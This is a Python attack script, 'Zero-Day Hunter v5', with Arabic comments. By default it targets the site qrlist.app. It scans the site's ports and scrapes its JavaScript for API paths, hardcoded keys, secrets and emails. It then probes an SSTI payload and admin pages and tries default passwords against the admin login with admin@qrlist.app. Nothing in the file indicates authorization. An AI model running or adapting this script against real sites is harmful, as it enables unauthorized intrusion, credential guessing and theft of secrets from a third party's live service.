#!/usr/bin/env python3
"""
🧠 Zero-Day Hunter v5 - AI Integration
يجمع كل شيء: AI Core + Nmap + Gobuster + SSTI + API
"""
import requests, sys, json, os, re, socket, subprocess, random, time
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

class ZeroDayV5:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.results = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "dns": {}, "ports": [], "paths": [], "apis": [],
            "keys": [], "emails": [], "vulns": [], "exploits": [],
            "score": 0
        }
        self.session = requests.Session()
    
    def log(self, msg): print(f"[🧠] {msg}")
    
    def phase1_recon(self):
        """المرحلة 1: استطلاع"""
        self.log("🔍 Phase 1: Recon")
        
        # DNS
        try:
            self.results["dns"]["ip"] = socket.gethostbyname(self.domain)
            self.log(f"   📡 {self.domain} → {self.results['dns']['ip']}")
        except:
            pass
        
        # Ports (سريع)
        for port in [80,443,22,21,3306,8080,8443]:
            s = socket.socket(); s.settimeout(1)
            if s.connect_ex((self.domain, port)) == 0:
                self.results["ports"].append(port)
            s.close()
        self.log(f"   🔌 {len(self.results['ports'])} ports")
        
        # HTTP
        try:
            r = self.session.get(self.target, timeout=10)
            self.results["http_status"] = r.status_code
            self.results["http_size"] = len(r.text)
            
            # استخراج APIs, Keys, Emails
            all_code = r.text
            js_files = re.findall(r'src="([^"]+\.js[^"]*)"', r.text)
            for js in js_files[:3]:
                try:
                    js_url = js if js.startswith('http') else f"{self.target.rstrip('/')}{js}"
                    all_code += self.session.get(js_url, timeout=5).text
                except: pass
            
            self.results["apis"] = list(set(re.findall(r'["\'](/[^"\']*(?:api|graphql|rest|v1)[^"\']*)["\']', all_code)))[:10]
            self.results["keys"] = list(set(re.findall(r'(?:key|token|secret|password)\s*[:=]\s*["\']([^"\']{8,})["\']', all_code, re.IGNORECASE)))[:10]
            self.results["emails"] = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', all_code)))[:10]
            
            self.log(f"   🔗 {len(self.results['apis'])} APIs")
            self.log(f"   🔑 {len(self.results['keys'])} Keys")
            self.log(f"   📧 {len(self.results['emails'])} Emails")
        except:
            pass
    
    def phase2_scan(self):
        """المرحلة 2: فحص"""
        self.log("🚨 Phase 2: Scan")
        
        # فحص SSTI
        try:
            r = self.session.get(f"{self.target}/api/stores?q={{{{7*7}}}}", timeout=5)
            if "49" in r.text:
                self.results["vulns"].append({"type":"SSTI","evidence":"{{7*7}} = 49"})
                self.log("   🚨 SSTI: {{7*7}} = 49")
        except: pass
        
        # فحص API
        try:
            r = self.session.get(f"{self.target}/api/stores", timeout=5)
            if r.status_code == 200 and len(r.text) > 100:
                data = r.json()
                stores = data.get('data', data) if isinstance(data, dict) else data
                if isinstance(stores, list):
                    self.results["api_stores"] = len(stores)
                    self.log(f"   📊 {len(stores)} stores via API")
        except: pass
        
        # فحص Admin
        for path in ["/admin","/admin/login"]:
            try:
                r = self.session.get(f"{self.target}{path}", timeout=5, allow_redirects=False)
                if r.status_code in [200, 302]:
                    self.results["paths"].append({"path":path,"status":r.status_code})
                    self.log(f"   🚨 {path} → {r.status_code}")
            except: pass
    
    def phase3_exploit(self):
        """المرحلة 3: استغلال"""
        self.log("💣 Phase 3: Exploit")
        
        # Dict Attack
        creds = [("admin","admin"),("admin","password"),("admin","123456")]
        for user, pwd in creds:
            try:
                r = self.session.post(f"{self.target}/admin/login",
                    data={"email":f"{user}@qrlist.app","password":pwd}, timeout=5)
                if r.status_code == 200 and len(r.text) > 5000:
                    self.results["exploits"].append({"type":"Password","user":user,"pass":pwd})
                    self.log(f"   🚨🚨🚨 {user}:{pwd}")
                    break
            except: pass
    
    def run(self):
        self.log(f"🧠 Zero-Day Hunter v5: {self.target}")
        self.log("═" * 60)
        
        self.phase1_recon()
        self.phase2_scan()
        self.phase3_exploit()
        
        # Score
        score = 0
        score += len(self.results["ports"]) * 3
        score += len(self.results["apis"]) * 5
        score += len(self.results["keys"]) * 2
        score += len(self.results["emails"]) * 5
        score += len(self.results["vulns"]) * 20
        score += len(self.results["exploits"]) * 50
        score += self.results.get("api_stores",0) * 3
        self.results["score"] = min(score, 100)
        
        self.log(f"\n📊 Score: {self.results['score']}/100")
        self.log(f"   📡 IP: {self.results['dns'].get('ip','?')}")
        self.log(f"   🔌 Ports: {self.results['ports']}")
        self.log(f"   🚨 Vulns: {len(self.results['vulns'])}")
        self.log(f"   💣 Exploits: {len(self.results['exploits'])}")
        
        # حفظ
        os.makedirs("logs/zeroday", exist_ok=True)
        fname = f"logs/zeroday/v5_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump(self.results, f, indent=2)
        self.log(f"📁 {fname}")
        
        return self.results

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://qrlist.app"
    ZeroDayV5(target).run()
